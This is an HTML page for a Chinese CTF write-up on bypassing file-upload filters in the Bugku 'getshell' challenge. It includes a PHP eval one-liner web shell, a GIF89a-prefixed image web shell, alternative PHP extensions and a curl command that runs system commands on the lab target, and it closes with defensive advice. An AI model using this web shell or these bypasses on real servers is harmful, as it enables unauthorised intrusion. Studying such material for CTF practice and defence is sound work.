@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- ↓↓↓ 改这里：标题 / 描述 / 地址 ↓↓↓ -->
+<title>Bugku 求getshell：上传绕过的一整套组合拳 · zhshy</title>
+<meta name="description" content="文件上传题的多层绕过记录：改 Content-Type、换 php5/phtml 后缀、加 GIF89a 做图片马，最后找到可执行的路径。">
+<meta name="author" content="zhshy">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="zhshy">
+<meta property="og:title" content="Bugku 求getshell：上传绕过的一整套组合拳">
+<meta property="og:description" content="这题不是改个后缀就完事，它同时拦了后缀、类型和内容，得逐个击破。">
+<meta property="og:url" content="https://zhshy-chi.github.io/writeups/bugku-getshell.html">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>
+(function () {
+  try {
+    var t = localStorage.getItem('theme');
+    if (t === 'light' || t === 'dark') document.documentElement.dataset.theme = t;
+  } catch (e) {}
+})();
+</script>
+</head>
+<!-- ↓ data-slug 必须和 writeups.js 里的 slug 一致，上一篇/下一篇才能对上 ↓ -->
+<body data-page="article" data-slug="bugku-getshell">
+<a class="skip-link" href="#main">跳到正文</a>
+<div class="progress" id="progress" aria-hidden="true"></div>
+
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html" aria-label="zhshy 首页">
+      <span class="brand-mark">~/</span><span class="brand-text">zhshy</span>
+    </a>
+    <nav class="site-nav" id="site-nav" aria-label="主导航">
+      <a href="../index.html">首页</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+    </nav>
+    <div class="header-actions">
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换深色/浅色主题">
+        <svg class="i-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.6v2.2M12 19.2v2.2M2.6 12h2.2M19.2 12h2.2M5.4 5.4l1.6 1.6M17 17l1.6 1.6M18.6 5.4 17 7M7 17l-1.6 1.6"/></svg>
+      </button>
+      <a class="icon-btn" href="https://github.com/zhshy-chi" target="_blank" rel="noopener" aria-label="GitHub 主页">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2A10 10 0 0 0 8.8 21.5c.5.1.7-.2.7-.5v-1.9c-2.8.6-3.4-1.3-3.4-1.3-.5-1.2-1.1-1.5-1.1-1.5-.9-.6.1-.6.1-.6 1 .1 1.5 1 1.5 1 .9 1.5 2.3 1.1 2.9.8.1-.7.4-1.1.7-1.4-2.2-.3-4.6-1.1-4.6-5 0-1.1.4-2 1-2.7-.1-.3-.4-1.3.1-2.7 0 0 .8-.3 2.7 1a9.3 9.3 0 0 1 5 0c1.9-1.3 2.7-1 2.7-1 .5 1.4.2 2.4.1 2.7.6.7 1 1.6 1 2.7 0 3.9-2.4 4.7-4.6 5 .4.3.7.9.7 1.9v2.8c0 .3.2.6.7.5A10 10 0 0 0 12 2Z"/></svg>
+      </a>
+      <button class="icon-btn nav-toggle" id="nav-toggle" type="button" aria-label="打开导航菜单" aria-expanded="false" aria-controls="site-nav">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+<article class="wrap article">
+
+  <nav class="breadcrumb" aria-label="面包屑">
+    <a href="../index.html">首页</a><span>/</span>
+    <a href="../writeups.html">Writeups</a><span>/</span>
+    <span class="current">Web</span>
+  </nav>
+
+  <header class="article-head">
+    <div class="article-badges">
+      <span class="badge" data-cat="Web">Web</span>
+      <span class="tag">文件上传</span>
+      <span class="tag">解析绕过</span>
+    </div>
+    <h1>Bugku 求getshell：上传绕过的一整套组合拳</h1>
+    <p class="article-meta">
+      <time datetime="2026-10-31">2026-10-31</time>
+      <span class="dot-sep">·</span>
+      <span>约 10 分钟</span>
+      <span class="dot-sep">·</span>
+      <span>Bugku CTF</span>
+    </p>
+    <p class="article-lead">
+      这题不是「改个后缀」就完事。它同时拦了后缀、类型和内容，只能一层一层试，把它们逐个击破 —— 也第一次让我把上传绕过的套路串成了清单。
+    </p>
+  </header>
+
+  <div class="article-layout">
+    <div class="prose" id="prose">
+
+      <h2>题目信息</h2>
+      <table>
+        <tbody>
+          <tr><th>平台</th><td>Bugku CTF</td></tr>
+          <tr><th>类型</th><td>Web / 文件上传</td></tr>
+          <tr><th>知识点</th><td>Content-Type、后缀黑名单、图片马、解析配置</td></tr>
+        </tbody>
+      </table>
+
+      <h2>先传一个 php 上去</h2>
+      <p>页面是个上传框，旁边提示「只能上传图片」。我先随手传了一个 shell.php，内容是一句话木马：</p>
+      <pre><code class="language-php">&lt;?php @eval($_POST['cmd']); ?&gt;</code></pre>
+      <p>回显是「文件类型不正确」。说明服务端有校验，而且大概率在看 Content-Type 或者后缀。先抓包，把请求里能改的地方都列出来：文件名、Content-Type、文件内容。上传题的所有绕过，本质上就是在这三个位置上做文章。</p>
+      <p>顺便说，报错的文案本身就是情报。「文件类型不正确」说明它先看类型，「文件后缀不允许」说明类型过了、还有后缀检查。两句话的先后，就是后端校验的先后 —— 按这个顺序去绕，比乱试快得多。</p>
+
+      <h2>第一层：改 Content-Type</h2>
+      <p>浏览器是根据后缀猜 Content-Type 的，但请求里的这个头由我们自己说了算。把它改成 image/png：</p>
+      <pre><code class="language-bash">Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/png</code></pre>
+      <p>如果后端只做 $_FILES['file']['type'] 的判断，这一改就过了。但这题没那么简单 —— 改完之后提示变成「文件后缀不允许」，说明还有一层后缀黑名单。两层的报错文案不一样，正好帮我确认了顺序。</p>
+
+      <h2>第二层：换一个能解析的后缀</h2>
+      <p>Apache 的 mod_php 认的不只是 .php。配置里如果有 AddType 或 AddHandler，.php5、.phtml、.pht、.phar 也可能被交给 PHP 解析。而黑名单往往只写了 .php：</p>
+      <pre><code class="language-bash">shell.php5
+shell.phtml
+shell.pht</code></pre>
+      <p>逐个试，看哪个能传上去并且真的被执行。注意：能不能执行取决于服务器配置，不是所有环境都认这些后缀，所以这里必须实际访问验证，不能想当然。</p>
+
+      <h2>第三层：文件头与图片马</h2>
+      <p>如果还有内容检测（getimagesize 或者 exif_imagetype），就在文件开头加图片魔数，让它在检查时是「合法图片」，在 PHP 解析时仍然是代码：</p>
+      <pre><code class="language-bash">GIF89a
+&lt;?php @eval($_POST['cmd']); ?&gt;</code></pre>
+      <p>GIF89a 只有 6 个字节，不影响后面的 PHP 标签被解析。用 copy /b 或者直接用文本拼接都行。传上去之后可以直接 POST 过去验证：</p>
+      <pre><code class="language-bash">curl -X POST "http://靶机/upload/shell.phtml" --data "cmd=system('id');"</code></pre>
+
+      <h2>第四层：路径与截断（看版本）</h2>
+      <p>有些老题保存时会拼后缀，比如 $name = 原名 . ".jpg"，这时可以试 %00 截断（PHP 5.3.4 之前、且 magic_quotes_gpc 关闭）、双写后缀（.pphphp 被过滤一次后变 .php）、或者大小写 .PHP 绕过黑名单。这几种都要先确认 PHP 版本和过滤逻辑，盲试很容易白忙一场。这题我试到第三层就够了，截断只是记进笔记。</p>
+
+      <h2>上传之后：找到能执行的路径</h2>
+      <p>传成功不等于能执行。要确认三件事：文件落在哪个目录（看回显路径或常见 uploads）、该目录是否允许脚本执行、访问时是不是被当成静态文件下载。这题的回显直接给了地址，访问一下就看到命令输出。如果回显不给路径，就得靠目录扫描和报错去猜。</p>
+      <p>另外，能执行之后别急着翻大件。先用 whoami、id、ls 确认权限和位置，再决定下一步；练习环境里点到为止，别真去动系统文件。</p>
+
+      <h2>复盘：三个白忙的坑</h2>
+      <ul>
+        <li>只改了 filename 的后缀，没改 Content-Type，一直卡在第一层；</li>
+        <li>用 .php5 传上去却打不开，因为那台机器只配了 .php 的 handler，换 .phtml 才行；</li>
+        <li>图片马传成功了，但访问时被当成图片下载 —— 目录不允许执行，这种情况只能换思路。</li>
+      </ul>
+      <p>上传题最忌讳「改一个地方、又不记录结果」。我后来固定用一张表：改了什么、返回什么、下一步试什么，三次之内基本能定位到卡在哪一层。</p>
+
+      <h2>防御：上传目录不该能解析</h2>
+      <ul>
+        <li>最有效的一条不是过滤后缀，而是让上传目录根本不执行脚本：Nginx 的 location 只允许静态，Apache 里 php_admin_flag engine off；</li>
+        <li>后缀白名单 + 服务端重命名，不信任用户给的文件名；</li>
+        <li>校验真实图片（重新编码），而不是只看前几个字节；</li>
+        <li>文件存到 Web 根目录之外，下载走统一的出口脚本。</li>
+      </ul>
+      <p>黑名单永远会漏 —— 漏一个不常见的可解析后缀就够了。白名单加「不解析」才是能落地的组合。</p>
+
+    </div>
+
+    <aside class="toc" id="toc" aria-label="文章目录">
+      <p class="toc-title">目录</p>
+      <nav id="toc-nav"></nav>
+    </aside>
+  </div>
+
+  <nav class="pager" id="pager" aria-label="上一篇与下一篇"></nav>
+  <p class="back-link"><a href="../writeups.html">← 返回全部 Writeups</a></p>
+
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p>© <span id="year">2026</span> zhshy · 本站内容仅供学习交流，请勿用于未授权测试</p>
+    <p class="footer-links">
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+      <a href="https://github.com/zhshy-chi/zhshy-chi.github.io" target="_blank" rel="noopener">源码</a>
+    </p>
+  </div>
+</footer>
+
+<script src="../assets/js/writeups.js"></script>
+<script src="../assets/js/site.js"></script>
+<script src="../assets/js/article.js"></script>
+</body>
+</html>
